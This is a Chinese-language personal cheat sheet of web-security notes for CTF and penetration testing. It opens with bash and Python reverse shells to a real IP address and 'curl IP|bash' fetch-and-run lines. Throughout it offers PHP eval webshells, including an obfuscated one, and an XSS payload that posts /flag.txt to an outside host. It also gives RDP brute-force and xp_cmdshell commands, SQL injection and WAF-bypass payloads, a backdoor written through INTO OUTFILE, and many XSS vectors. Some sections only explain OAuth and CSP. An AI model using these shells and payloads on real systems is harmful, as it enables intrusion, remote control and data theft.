---
title: Web 安全笔记
date: 2018-1-26 14:10:17
tags:  笔记
abstract: 我听过的会忘掉，我看过的能记住，我做过的才真正明白。
---

某大牛云，渗透测试本质上是信息收集。

每次比赛都当成查漏补缺，不会的赛后一定要搞懂。



**吾日三省吾身**

+ 能不能更多（办法、知识）？

+ 能不能更深？

+ 能不能更底层？

## 常用信息

```shell
# bash 弹
bash -i >& /dev/tcp/47.101.220.241/8888 0>&1

curl 47.101.220.241|bash

# ip 转换
47.101.220.241 → 795204849

# py 弹（不太稳定）
#coding:utf-8
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("47.101.220.241",8888)) #更改localhost为自己的外网ip,端口任意
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])

curl 795204849|python  # 这样不行？直接404
curl 47.101.220.241|python

<?php eval($_GET[1]);?>
```



## 每天学点新东西

```
\x09  => 正常十六进制
%09  => URL 编码
```



```php
<?php
function runCommand($cmd) {
    $descriptors = [
        0 => array("pipe", "rw"),
        1 => array("pipe", "w"),
        2 => array("pipe", "w"),
    ];
    $pipes = [];
    $process = \proc_open($cmd, $descriptors, $pipes, __DIR__);
    $stderr = '';
    $stdout = '';
    if (\is_resource($process)) {
        stream_set_blocking($pipes[2], FALSE);
        stream_set_blocking($pipes[1], FALSE);
        while (true) {
            if (!feof($pipes[1])) {
                $a = fgetc($pipes[1]);
                if ($a !== false) {
                    $stdout .= $a;
                    if (preg_match("/input your answer:/", $stdout)) {
                    	$stdout = explode("first", $stdout)[1];
                    	$stdout = explode("input", $stdout)[0];
                    	$ret = eval('return ' . $stdout . ';');
                    	echo $ret;
                    	fwrite($pipes[0], $ret . "\r\n");
                    	fflush($pipes[0]);
                    	fclose($pipes[0]);
                    }
                }
            }
            if (feof($pipes[2]) && feof($pipes[1])) {
                break;
            }
        }
        \fclose($pipes[1]);
        \fclose($pipes[2]);
        $status = \proc_close($process);
    }
    return [$stdout, $stderr, $status];
}

var_dump(runCommand('/readflag'));
```





如果我们想给web目录文件添加自定义waf脚本，其实可以用一条命令解决,以php为例：

```shell
find /var/www/html -type f -path "*.php" | xargs sed -i "s/<?php/<?php require_once('/tmp/waf.php');n/g"
```



```shell
ssh <-p 端口> 用户名@IP　　
scp 文件路径  用户名@IP:存放路径　　　　
tar -zcvf web.tar.gz /var/www/html/　　
pkill -kill -t <用户tty>　　 　　
ps aux | grep pid或者进程名　　　　
#查看已建立的网络连接及进程
netstat -antulp | grep EST
#查看指定端口被哪个进程占用
lsof -i:端口号 或者 netstat -tunlp|grep 端口号
#结束进程命令
kill PID
killall <进程名>　　
kill - <PID>　　
#封杀某个IP或者ip段，如：.　　
iptables -I INPUT -s . -j DROP
iptables -I INPUT -s ./ -j DROP
#禁止从某个主机ssh远程访问登陆到本机，如123..　　
iptable -t filter -A INPUT -s . -p tcp --dport  -j DROP　　
#备份mysql数据库
mysqldump -u 用户名 -p 密码 数据库名 > back.sql　　　　
mysqldump --all-databases > bak.sql　　　　　　
#还原mysql数据库
mysql -u 用户名 -p 密码 数据库名 < bak.sql　　
find / *.php -perm  　　 　　
awk -F:  /etc/passwd　　　　
crontab -l　　　　
#检测所有的tcp连接数量及状态
netstat -ant|awk  |grep |sed -e  -e |sort|uniq -c|sort -rn
#查看页面访问排名前十的IP
cat /var/log/apache2/access.log | cut -f1 -d   | sort | uniq -c | sort -k  -r | head -　　
#查看页面访问排名前十的URL
cat /var/log/apache2/access.log | cut -f4 -d   | sort | uniq -c | sort -k  -r | head -　
```



扫同网段端口

```shell
arp -an
arp-scan -l ?
```



curl 带文件

```html
comment=<iframe srcdoc="<script>fetch('exec.php',{method:'POST',headers:{'content-type':'application/x-www-form-urlencoded'},body:'command='+encodeURIComponent('curl xss.zsxsoft.com:23457 -F"a=@/flag.txt"')+'&exec=1'}).then(p=>p.text()).then(p=>fetch('main.php',{method:'POST',headers:{'content-type':'application/x-www-form-urlencoded'},body:'comment='+p}))</script>
"></iframe>
```



ncrack爆破3389

```shell
ncrack -vv -u administrator -P '/tmp/D5B0U/1000-top.txt' 10.22.2.3:3389,CL=1 -f
```



`netdiscover` 直接扫描局域网内所有网段



**mssql提权**

sa用户如何开启xp_cmdshell

```shell
EXEC sp_configure 'show advanced options',1;//允许修改高级参数
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1;  //打开xp_cmdshell扩展
RECONFIGURE;
```



Windows下利用dos如何搜索文件

```shell
for /r c:\ %i in (Newslist*.aspx) do @echo %i
for /r c:\ %i in (Newslist.aspx*) do @echo %i
```



dos命令下写文件遇到`<>`如何处理

```shell
echo ^<^> > 123.txt
```



```shell
# 查看本机开放端口
netstat -tln
```



极限 `webshell`

```php
<?php
    @$_++; // $_ = 1
    $__=("#"^"|"); // $__ = _
    $__.=("."^"~"); // _P
    $__.=("/"^"`"); // _PO
    $__.=("|"^"/"); // _POS
    $__.=("{"^"/"); // _POST 
    ${$__}[!$_](${$__}[$_]); // $_POST[0]($_POST[1]);
?>
```



**CTF 出题套路**

一、爆破，包括包括md5、爆破随机数、验证码识别等

二、绕WAF，包括花式绕Mysql、绕文件读取关键词检测之类拦截

三、花式玩弄几个PHP特性，包括弱类型，strpos和===，反序列化+destruct、\0截断、iconv截断、

四、密码题，包括hash长度扩展、异或、移位加密各种变形、32位随机数过小

五、各种找源码技巧，包括git、svn、xxx.php.swp、*www*.(zip|tar.gz|rar|7z)、xxx.php.bak、

六、文件上传，包括花式文件后缀 .php345 .inc .phtml .phpt .phps、各种文件内容检测<?php <? <% \<script language=php>、花式解析漏洞、

七、Mysql类型差异，包括和PHP弱类型类似的特性,0x、0b、1e之类，varchar和integer相互转换

八、open_basedir、disable_functions花式绕过技巧，包括dl、mail、imagick、bash漏洞、DirectoryIterator及各种二进制选手插足的方法

九、条件竞争，包括竞争删除前生成shell、竞争数据库无锁多扣钱

十、社工，包括花式查社工库、微博、QQ签名、whois

十一、windows特性，包括短文件名、IIS解析漏洞、NTFS文件系统通配符、::$DATA，冒号截断

十二、SSRF，包括花式探测端口，302跳转、花式协议利用、gophar直接取shell等

十三、XSS，各种浏览器auditor绕过、富文本过滤黑白名单绕过、flash xss、CSP绕过

十四、XXE，各种XML存在地方（rss/word/流媒体）、各种XXE利用方法（SSRF、文件读取）

十五、协议，花式IP伪造 X-Forwarded-For/X-Client-IP/X-Real-IP/CDN-Src-IP、花式改UA，花式藏FLAG、花式分析数据包



![img](https://pic4.zhimg.com/80/133c88180340b844466e8fa5552e122b_hd.jpg)



```php
<?=$_GET[0]($_POST[1])?>
```

`eval()` 是语言构造器，而不是函数，不能用可变函数的形式调用它，这里可以使用 `assert`



**子域名检测工具**

Layer子域名挖掘机、Sublist3r、dnsmaper、



做题的时候不要忘了乌云，搜索会有惊喜



很多人会忘记 127.0.0.0/8 ，认为本地地址就是 127.0.0.1 ，实际上本地回环包括了整个127段。你可以访问`http://127.233.233.233/`，会发现和请求127.0.0.1是一个结果



#### [超赞网络资源总结](https://www.cnblogs.com/iamstudy/p/document_write_1.html)

挺多不错的东西，点点散散记到笔记就不知道跑哪去了。

代码审计
1、全面总结
<https://find-sec-bugs.github.io/>

2、python安全
<https://github.com/bit4woo/python_sec>

------

内网渗透
1、内网渗透攻防总结
<https://github.com/infosecn1nja/AD-Attack-Defense>

2、红队
<https://github.com/yeyintminthuhtut/Awesome-Red-Teaming>
<https://github.com/bluscreenofjeff/Red-Team-Infrastructure-Wiki>

案例
1、赏金猎人漏洞案例
<https://github.com/ngalongc/bug-bounty-reference>

know it then do it



`ph` 师傅的 来自小密圈的那些奇技淫巧

**`eval()`长度限制突破方法**

```php
<?php
$param = $_REQUEST['param'];
if (
    strlen($param) < 17 &&
    stripos($param, 'eval') === false &&
    stripos($param, 'assert') === false
) {
    eval($param);
}
```

```php
$_GET[1];
exec($_GET[1]);

include$_GET[1]
foo.php?1=file_put_contents&param=$_GET[1](N, P, 8);
foo.php?1=file_put_contents&param=$_GET[1](N, D, 8);
					...
foo.php?1=file_put_contents&param=$_GET[1](N, W, 8);
/* 'PD9waHAgZXZhbCgkX1BPU1Rb0V0p0w' 被写入文件 'N' 中 */

foo.php?param=include$_GET[1];
&1=php://filter/read=convert.base64-decode/resource=N
```

**命令长度限制突破技巧**

**MySQL 突破换行符的技巧**

**命令执行waf绕过技巧**

**无字母数字webshell构造技巧**



> 之前学习`phar`协议反序列化时fuzz过一遍PHP函数，发现了PHP的一个特点：**只要是传filename的地方，基本都可以传协议流**。而`file_put_contents`的第一个参数显然就是传`filename`的地方，那么试试可不可以利用php伪协议？



get_defined_vars ( void ) : array

此函数返回一个包含所有已定义变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义的变量。



'SERVER_NAME'

当前运行脚本所在的服务器的主机名。如果脚本运行于虚拟主机中，该名称是由那个虚拟主机所设置的值决定。

> **Note**: 在 Apache 2 里，必须设置 *UseCanonicalName = On* 和 *ServerName*。 否则该值会由客户端提供，就有可能被伪造。 上下文有安全性要求的环境里，不应该依赖此值。

$_server['server_name'] 一般来说是可控的，为下文的 Host 

```
POST / HTTP/1.1
Host: php
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0
```



```php
if(!in_array(pathinfo($log_name, PATHINFO_EXTENSION), 
  ['php', 'php3', 'php4', 'php5', 'phtml', 'pht'], true)) {
     file_put_contents($log_name, $output);
}
```

只要在后缀名后加上`/.`，pathinfo() 就取不到后缀名，且可以正常写入`.php`之中



win-server 拿到权限后可通过 `mimikatz` 获得管理员密码

GitHub ：webdirscan weakfilescan bbscan



有几个同学在问CTF里flag怎么找，因为比较基础所以我没讲过。
拿到shell以后，如何找flag？

其实这也是实际安全测试中的一个问题：拿到shell后，如何找一些敏感信息，从而辅助后续渗透。拿code-breaking puzzles举例，首先查看官网的说明：[代码审计知识星球二周年 && Code-Breaking Puzzles](https://code-breaking.com/intro/) ，里面明确写了flag的格式是“flag{some_thing}”（图1）
那么我的目标就是，拿到shell以后在系统上找包含了这个格式的内容，这个内容可能是文件名、文件内容，甚至是数据库里的内容。
首先我肯定是在文件里找，如grep：grep -r 'flag{.\*}' .
还有一些其他方法，比如有的flag是写在文件里的，我就可以找包含了flag这个关键词的文件名：find / -name "\*flag\*"
当然，如果是php的题，不一定能拿到系统的shell。如果拿到的是webshell，也可以用php的scandir、glob等函数来遍历目录，查找flag。（参考 [ZH奶酪：PHP遍历目录/文件的3种方法 - ZH奶酪 - 博客园](https://www.cnblogs.com/CheeseZH/p/4560602.html) ）

### CMS 至少自己会搭建

CMS部分搭建，框架部分随便写点什么玩意

```
Java
	Stucts2
	Spring MVC / Spring Boot

PHP
	ThinkPHP 3
	ThinkPHP 5
	CI
	Laravel -> Symfony
	Yii
	Yaf

	DeDeCMS
	PHPCMS
	帝国CMS
	WordPress
	Drupal
	Joomla!
	phpBB
	Discuz!
	phpWind

Python
	Django
	Flask

Ruby
	rails

Nodejs
	Express / Koa
	Nuxtjs
	Eggjs

Golang
	Iris
```



### OAuth2.0

**作用** ：让(第三方)客户端安全可控地获取用户的授权

#### 名词定义

+   Third-party application：第三方应用程序，又称为客户端
+   HTTP service：HTTP服务提供商
+   Resource Owner：资源所有者，又称用户
+   User Agent：用户代理，例如，浏览器
+   Authorization server：认证服务器
+   Resource server：资源服务器

#### 运行流程

![avatar](http://www.ruanyifeng.com/blogimg/asset/2014/bg2014051203.png)

​	（A）用户打开客户端以后，客户端要求用户给予授权

​	（B）用户同意给予客户端授权

​	（C）客户端使用上一步获得的授权，想认证服务器申请令牌

​	（D）认证服务器对客户端进行认证以后，确认无误，同意发放令牌

​	（E）客户端使用令牌，向资源服务器申请获取资源

​	（F）资源服务器确认令牌无误，同意客户端开放资源

### 客户端的授权模式

+   授权码模式（authorization code）
+   简化模式（implicit）
+   密码模式（resource owner password credentials）
+   客户端模式（client credentials）



## 信息收集

### 域名信息

### 站点信息

### CDN Bypass

### 端口信息

### 其他

- web服务器：Apache、Tomcat、IIS
- 跑在什么系统上
- 可以利用已知漏洞绕过题目直接拿flag



## SQL 注入

### 预备知识

![img](https://qqadapt.qpic.cn/txdocpic/0/8f76487a3fe36749dfd454f8ac4d8c78/0)



+ 基于从服务器接收到的响应
  + 基于错误的SQL注入
  + 联合查询的类型
  + 堆查询注入
  + SQL盲注
    + 基于布尔SQL盲注
    + 基于时间的SQL盲注
    + 基于报错的SQL盲注

+ 基于如何处理输入的SQL查询（数据类型）
  + 基于字符串
  + 数字或整数为基础的

+ 基于程度和顺序的注入(哪里发生了影响)

  + 一次注入

    输入的注入语句对WEB直接产生了影响，出现了结果

  + 二次注入

    类似存储型XSS，是指输入提交的语句，无法直接对WEB应用程序产生影响，

    通过其它的辅助间接的对WEB产生危害，这样的就被称为是二次注入

+ 基于注入点的位置上的
  + 通过用户输入的表单域的注入
  + 通过cookie注入
  + 通过服务器变量注入（基于头部信息的注入）

#### MySQL

```sql
-- Default Databases
mysql					Requires root privileges
information_schema		Available from version 5 and higher

Comment Out Query
# /**/ -- - ;%00 `

select user();							-- 数据库用户名
select version();						-- MySQL版本
select database();						-- 数据库名
select @@basedir;						-- 数据库安装路径
select @@datadir;						-- 数据存储路径
select @@version_compile_os;		    -- 操作系统版本
show global variables like '%secure%';	-- 
if(expr,v1,v2)							-- expr正确则v1，否则v2
select case when expr then v1 else v2 end;  -- 与 if 功能相同
select concat('11', '22', '33');		-- 字符串连接 112233
select concat_ws(x, s1,s2...sn)			-- 以 x 作为连接符，将字符串连接
select group_concat()							-- 把查询出来的多行连接起来
select mid(str, start, count)			-- 从start开始截取count个字符
select substr(database(), 1, 1)			-- 与mid同
# 如果用不了逗号，直接 from start for count
# union select * from (select 1)a join (select 2)b == union select 1,2
select left(str, count)					-- 截取左边count个字符
select ord()							-- 返回第一个字符的ASCII码
select ascii()							-- 与ord同
select char(32, 58, 32)					-- ' : ' 即空格+ : +空格
select length(database());
delete from table_name where id=1;		-- 不加限制条件将删除整张表
drop database ds_name;
drop column column_name;
alter table table_name;
update table_name set column_name='new' where id=1;  -- 更新
/*!50000select*/
where id = 0.1 union select ...
xor, ||, &&, !, not，<>
```



### 类型

##### union 注入

所查询的字段数需与主查询一致

字段数可先用 order by x 来确定

```sql
union select 1, 2 from user where id = 1 or 1=1
```



##### information_schema 注入

存储数据库信息的数据库

> **数据库名**
>
> schemata => schema_name
>
>tables => table_schema
>
>columns => table_schema
>
>**表名**
>
>tables => table_name
>
>columns => table_name
>
>**列名**
>
>columns => columns_name

```sql
select 1,group_concat(table_name) from information_schema.tables where table_schema=database() -- 获取当前数据库中所有表
select 1,group_concat(column_name) from information_schema.columns where table_name=0x7365637265745f666c6167; -- 获得所有列名（字段），table_name 参数进行十六进制编码后可绕过引号被过滤
-1′ or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #
-- 下载数据
-1′ union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #  -- 获取表中的字段名
```



##### 函数报错信息注入

>  前提：后台没有屏蔽数据库报错信息，在语法发生错误时会输出到前端

常用报错函数：updatexml(), extractvalue(), floor() [十种MySQL报错注入](https://blog.csdn.net/whatday/article/details/63683187)  [【SQL注入】报错注入姿势总结](http://vinc.top/2017/03/23/%E3%80%90sql%E6%B3%A8%E5%85%A5%E3%80%91%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/)

```sql
and (extractvalue(1,concat(0x7e,(select user()),0x7e)));%23
and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);%23
```

基于函数报错信息获取（select, insert, update, delete)



##### insert / update / delete 注入

结合函数报错信息，将函数插入到语句中



##### http header 注入

如 `XFF`，`referer`

观察点：后台收集了请求头中的信息，并存入到数据库中



##### 布尔盲注

结合 and 进行逻辑判断

效率太低，写脚本爆



##### 时间盲注

无显示回显，可在以前的基础上加入 `sleep()` 语句，若明显延迟，则注入成功

`BENCHMARK(count,expr)`  执行 `count` 次的 `expr`，如 BENCHMARK(10000000,SHA(‘1’))

即使 `sleep` 和 `benchmark` 都被过滤了，但是我们依然可以通过让Mysql进行复杂运算，

以达到延时的效果，比如可以用字段比较多的表来计算笛卡尔积

```sql
select count(*) 
from information_schema.columns A, 
information_schema.columns B, 
information_schema.columns C#
```

还有 `get_lock()`



##### 利用注入写入后门

前提：开启 secure_file_priv，并且具有写的权限

```sql
select 1,2,'<?php system($_GET[1])?>' into outfile 'H:\\a.php'--%20
```



**POST 登录框 sqlmap跑法**

```shell
sqlmap -u "http://47.96.118.255:33066/" --forms --dbs
sqlmap -u "http://47.96.118.255:33066/" --forms -D news --tables
sqlmap -u "http://47.96.118.255:33066/" --forms -D news -T secret_table --dump
```

**自定义注入位置，如 XFF 注入**

```shell
sqlmap -u "http://192.168.118.142/" --headers="X-Forwarded-For: *" --banner
```

**猜解数据表**

找到注入点后，进行猜解

```sql
and exists(select * from user)  -- 表存在页面就会返回正常，否则报错
and exists(select * from amdin)
```

### Bypass

检测被过滤的关键词：

+ fuzz 一波 ASCII 码

+ id = 1 ^ (length(‘xxx’)=3)

#### 空格

- 使用注释绕过，/**/ (/\*1\*/)

- 使用括号绕过，括号可以用来包围子查询，任何计算结果的语句都可以使用 ( ) 包围

    ```sql
    select(group_concat(table_name))
    from(information_schema.tables)
    where(table_schema=database())
    ```

- 使用符号替代空格 

    ```
    %20 	空格
    %09		TAB 键（水平）
    %0b		TAB 键（垂直）
    %0d		return 功能
    %0c		新的一页
    %a0		空格
    %0a		新建一行
    
    SQLite3 0A 0D 0C 09 20 
    MySQL5 09 0A 0B 0C 0D A0 20 
    PosgresSQL 0A 0D 0C 09 20 
    Oracle 11g 00 0A 0D 0C 09 20 
    MSSQL 01,02,03,04,05,06,07,08,09,0A,0B,0C,0D,0E,0F,10,11,12,13,14,15,16,17,18,19,1A,1B,1C,1D,1E,1F,20
    ```

    

#### 引号

```sql
select column_name from information_schema.tables where table_name="users"
```

如果引号被过滤了，那么上面的`where`子句就失效了，此时可以使用**十六进制**。
`users`的十六进制的字符串是`7573657273`。那么最后的sql语句就变为了：

```sql
select column_name  from information_schema.tables where table_name=0x7573657273
```

**宽字节绕过**

```
%bf%27 %df%27 %aa%27
```

#### 逗号

`substr(), mid()` 里的逗号可用 `from for` 代替

```sql
select substr(database(0 from 1 for 1);
select mid(database(0 from 1 for 1);
```

对于 `limit` 里面的逗号可以使用 `offset` 绕过

```sql
select * from news limit 0,1  
<=>
select * from news limit 1 offset 0
```

#### 比较符

大于、小于可用 `greatest(), least()` 代替，还可以 `between and`

```sql
select * from users where id=1 and ascii(substr(database(),0,1))>64
select * from users where id=1 and greatest(ascii(substr(database(),0,1)),64)=64
```

#### 条件连接词

```
利用符号:
and => &&
or => ||
xor => |
not => !

大小写变形: Or, OR, oR
添加注释: o/**/r
编码：hex, urlencode
```

#### union, select, where

（1）使用注释符绕过：

```
//，-- , /**/, #, --+, -- -, ;,%00,--a
U/**/ NION /**/ SE/**/ LECT /**/user，pwd from user

sele%ct IIS 服务器可以插入 %
```

（2）使用大小写绕过：

```
id=-1'UnIoN/**/SeLeCT
```

（3）内联注释绕过：

```
id=-1'/*!UnIoN*/ SeLeCT 1,2,concat(/*!table_name*/) FrOM /*information_schema*/.tables /*!WHERE *//*!TaBlE_ScHeMa*/ like database()#
```

（4） 双关键字绕过：

```
id=-1'UNIunionONSeLselectECT1,2,3–-
```

（5）科学计数法

```
id=0e1union 
```



#### 表名等关键词

以information_schema.tables为例

空格 `information_schema . tables`

着重号 `information</em>schema.tables`

特殊符 `/!informationschema.tables/`

别名 `information_schema.(partitions),(statistics),(keycolumnusage),(table_constraints)`



#### 注释符

常用注释符：`#, --+, /**/`，可以用 `;%00` 代替

不用注释符，与后面的语句构造闭合就行，如 `||'1`，恰好与 `’ LIMIT 0,1` 闭合

#### 等号

使用 `like 、rlike 、regexp` 或者  `< , >`

### 杂项

sqlmap 中`--file-read`参数，可以读取服务器端任意文件

```shell
python sqlmap -u "127.0.0.1/index.php?id=1 %df'" --file-read="./index.php"
```

```
-u 单个URL -m xx.txt 多个URL
-d "mysql://user:password@10.10.10.137:3306/dvwa"  作为服务器客户端，直接连接数据库
--data post/get都适用
-p 指定扫描的参数
-r 读取文件
-f 指纹信息
--tamper 混淆脚本，用于应用层过滤
--cookie --user-agent --host等等http头的修改
--threads 并发线程 默认为1
--dbms MySQL<5.0> 指定数据库或版本

–level=LEVEL 执行测试的等级（1-5，默认为 1）
–risk=RISK 执行测试的风险（0-3，默认为 1） Risk升高可造成数据被篡改等风险
–current-db / 获取当前数据库名称
–dbs 枚举数据库管理系统数据库
–tables 枚举 DBMS 数据库中的表
–columns 枚举 DBMS 数据库表列
-D DB 要进行枚举的数据库名
-T TBL 要进行枚举的数据库表
-C COL 要进行枚举的数据库列
-U USER 用来进行枚举的数据库用户
```

确定字段数：order by n，select 1,2,…,n

确定显示位：select 1,2,3,4,5 ，然后看显示哪个数字，之后的查询语句最好用@或者NULL，防止数据类型不匹配而造成的测试失败，即 `select @, @, NULL`

[preg_match()](http://php.net/manual/zh/reference.pcre.pattern.modifiers.php)

+ i ==> 大小写不敏感
+ m ==> 可多行匹配
+ s ==> `.`匹配所有字符，包括换行符
+ x ==> 

**思路**

+   简单注入，手工或sqlmap跑
+   判断注入点，是否是http头注入？是否在图片处注入
+   判断注入类型
+   利用报错信息注入
+   尝试各种绕过过滤的方法
+   查找是否是通用某模板存在的注入漏洞，比如 ThinkPHP 3.2

**Tricks**

```shell
sql-mode = "STRICT_TRANS_TABLES"(默认未开启)
插入长数据截断，插入'admin                      x'绕过或越权访问(束缚攻击？)

注意二次注入
isg2015 web350 username 从 session 中直接带入查询，利用数据库字段长度截断，
\ 被 gpc 后为 \\，但是被截断了只剩下一个 \，引发注入

如果猜解不出数据库的字段，搜索后台，查看源代码，源代码登陆时的表单中的字段一般和数据库的相同

# 绕过安全狗
sel%ect
针对 asp + access，首先来挖掘一下数据库的特性：
1.可代替空格的字符：%09, %0A, %0C, %0D
2.可截断都免语句的注释符有：%00, %16, %22, %27
3.当 %09, %0A, %0C或%0D 超过一定长度后，安全狗的防御便失效了
4.UserAgent：BaiduSpider

有 magic_quotes_gpc = on 的情况下，
提交的参数如果带有单引号"'"，就会被自动转义"\'"，使很多注入攻击无效

gbk 双字节编码：一个汉字用两个字节表示，首字节都应 0x81-0xFE,
尾字节对应 0x40-0xfe(除0x7f)，刚好涵盖了转义字符\对应的编码 0x5c

0xD50x5C 对应了汉字“诚”，URL编码用百分号加字符的16进制编码表示字符，
于是 %d5%5c 经URL解码后为“诚”
0xD50x5c 不是唯一可以绕过单引号转义的字符，0x81-0xFE 开头 + 0x5c 的字符应该都可以


# 偏移注入
2.select * from admin as inner join 
  index.asp?id=886and 1=2 union select 1,2,3,4,* from(admin as a inner join admin as   b on a.id=b.id)
 查询条件是 a 表的 id 列与 b 表的 id 列相等，返回所有相等的行，显然，a,b都是同一个表，当然全部返回
```

Access 是以单文件，mdb 格式，以表的形式存在，所以数据库也就只有一个文件，只能靠暴力猜解。

> Access  ->  表名  ->  列名  ->  数据


## XSS

类型：

+   简单存储型 xss 盲打管理员后台
+   各种浏览器 auditor 绕过
+   富文本过滤黑白名单绕过
+   CSP 绕过
+   Flash xss
+   AngularJS 客户端模板 xss

工具：

+   hackbar

+   xss 平台
+   swf decompiler
+   flasm
+   doswf(swf加密)
+   Crypt Flow(swf加密)

思路：

+   简单的xss，未作任何过滤，直接利用xss平台盲打管理员cookie
+   过滤标签，尝试各种绕过方法
+   存在安全策略csp等，尝试相应的绕过方法
+   逆向 .swf 文件，审计源码，构造 xss payload

### 知识点

#### 同源策略

同源策略限制了不同源之间如何进行资源交互，是用于隔离潜在恶意文件的重要安全机制。

何为同源？

+ 协议相同（http/https）
+ host 相同
+ 端口相同

#### 常见标签

**`<img>`**

```html
<img src=javascript:alert("xss")>
<IMG SRC=javascript:alert(String.formCharCode(88, 83, 83))>
<img src="URL" style='Xss:expression(alert(/xss));'>
<!--CSS标记xss-->
<img style="background-image:url(javascript:alert('XSS'))">
    
<img src="x" onerror=alert(1)>
<img src="1" onerror=eval("alert('xss')")>
    
<img src=1 onmouseover=alert('xss')>
```

**`<a>`**

```html
<a href="https://www.baidu.com">baidu</a>

<a href="javascript:alert('xss')">aa</a>
<a href=javascript:eval(alert('xss'))>aa</a>
<a href="javascript:aaa" onmouseover="alert(/xss/)">aa</a>

<script>alert('xss')</script>
<a href="" onclick=alert('xss')>aa</a>

<a href="" onclick=eval(alert('xss'))>aa</a>

<a href=kycg.asp>ttt=1000 onmouseover=prompt('xss') y=2018>aaa</a>
```

**`input`**

```html
<input name="name" value="">
    
<input value="" onclick=alert('xss') type="text">
    
<input name="name" value="" onmouseover=prompt('xss') bad="">
    
<input name="name" value=""><script>alert('xss')</script>

<input onfocus="alert('xss');">

竞争焦点，从而触发 onblur 事件
<input onblur=alert('xss') autofocus><input autofocus>

通过 autofocus 属性执行本身的 focus 事件，
这个向量是使焦点自动跳到输入元素上，触发焦点事件，无需用户触发
<input onfocus="alert('xss');" autofocus>
```

**`form`**

```html
<form action=javascript:alert('xss') method="get">
<form action=javascript:alert('xss')>
    
<form method=post action=aa.asp? onmouseover=prompt('xss')>
<form method=post action=aa.asp? onmouseover=alert('xss')>
<form action=1 onmouseover=alert('xss')>
    
<!--原code-->
<form method=post action="data:text/html;base64,<script>alert('xss')</script>">
<!--base64编码-->
<form method=post action="data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=">
```

**`<iframe>`**

```html
<iframe src=javascript:alert('xss');height=5width=1000 /><iframe>
    
<iframe src="data:text/html,&lt;script&gt;alert('xss')&lt;/script&gt;"></iframe>
<!--原code-->
<iframe src="data:text/html;base64,<script>alert('xss')</script>">
<!--base64编码-->
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=">
    
<iframe src="aaa" onmouseover=alert('xss') /><iframe>
    
<iframe src="javascript&colon;prompt&lpar;`xss`&rpar;"></iframe>
```

**`<svg>`**

```html
<svg onload=alert(1);>
<svg/onload=prompt(1)
```

**`<details>`**

```html
<details ontoggle="alert('xss');">
    
使用 open 属性触发 ontoggle 事件，无需用户触发
<details open ontoggle="alert('xss');">
```

**`<select>`**

```html
<select onfocus=alert(1)></select>

通过 autofocus 属性执行本身的 focus 事件，
这个向量是使焦点自动跳到输入元素上，触发焦点事件，无需用户触发
<select onfocus=alert(1) autofocus>
```



#### 编码绕过

**JS编码**

JS提供了四种字符编码的策略，

- 三个八进制数字，如果数字不够，在前面补零，如`a`的编码为`\141`
- 两个十六进制数字，如果数字不够，在前面补零，如`a`的编码为`\x61`
- 四个十六进制数字，如果数字不够，在前面补零，如`a`的编码为`\u0061`
- 对于一些控制字符，使用特殊的C类型的转义风格，如`\n`和`\r`

**HTML实体编码**

以`&`开头，以分号结尾的，即HTML编码，如`<`的编码为`&1t;`

十进制，十六进制的ASCII码或者Unicode字符编码。样式为`&#数值;`

如`<`的编码为`&#60;` (10进制)`&#x003c;` (16进制)

**URL编码**

这里为url全编码，也就是两次url编码

如`alert`的url全编码为`%25%36%31%25%36%63%25%36%35%25%37%32%25%37%34`

**String.fromCharCode 编码**

如`alert`的编码为`String.fromCharCode(97,108,101,114,116)`

### Bypass

### 杂项

#### CSP 绕过总结

##### CSP 是什么？

> Content Security Policy 用来防御 XSS 攻击的技术。它是一种由开发者定义的安全性政策申明，通过 CSP 指定可信的内容来源，让 WEB 处于一个安全的运行环境中。

例如：

```
Content-Security-Policy: default-src 'self'; script-src 'self';
```

**指令说明**

| 指令        | 说明                                                |
| ----------- | --------------------------------------------------- |
| default-src | 定义资源默认加载策略                                |
| connect-src | 定义 Ajax、WebSocket 等加载策略                     |
| font-src    | 定义 Font 加载策略                                  |
| frame-src   | 定义 Frame 加载策略                                 |
| img-src     | 定义图片加载策略                                    |
| media-src   | 定义 <audio>、<video> 等引用资源加载策略            |
| object-src  | 定义 <applet>、<embed>、<object> 等引用资源加载策略 |
| script-src  | 定义 JS 加载策略                                    |
| style-src   | 定义 CSS 加载策略                                   |
| sandbox     | 值为 allow-forms，对资源启用 sandbox                |
| report-uri  | 值为 /report-uri，提交日志                          |

**关键词**

| 属性值                              | 示例                                        | 说明                                                         |
| ----------------------------------- | ------------------------------------------- | ------------------------------------------------------------ |
| *                                   | img-src *                                   | 允许从任意url加载，除了data:blob:filesystem:schemes          |
| 'none'                              | object-src 'none'                           | 禁止从任何url加载资源                                        |
| 'self'                              | img-src 'self'                              | 只可以加载同源资源                                           |
| data:                               | img-src 'self' data:                        | 可以通过data协议加载资源                                     |
| domain.example.com                  | ing-src domain.example.com                  | 只可以从特定的域加载资源                                     |
| *.example.com                       | img-src *.example.com                       | 可以从任意example.com的子域处加载资源                        |
| [https://cdn.com](https://cdn.com/) | img-src [https://cdn.com](https://cdn.com/) | 只能从给定的域用https加载资源                                |
| https:                              | img-src https:                              | 只能从任意域用https加载资源                                  |
| 'unsafe-inline'                     | script-src 'unsafe-inline'                  | 允许内部资源执行代码例如style attribute,onclick或者是sicript标签 |
| 'unsafe-eval'                       | script-src 'unsafe-eval'                    | 允许一些不安全的代码执行方式，例如js的eval()                 |



##### 过滤空格

用`/`代替空格

```html
<img/src="x"/onerror=alert("xss");>
```

#### 过滤关键字

##### 大小写绕过

```html
<ImG sRc=x onerRor=alert("xss");>
```

##### 双写关键字

有些waf可能会只替换一次且是替换为空，这种情况下我们可以考虑双写关键字绕过

```html
<imimgg srsrcc=x onerror=alert("xss");>
```

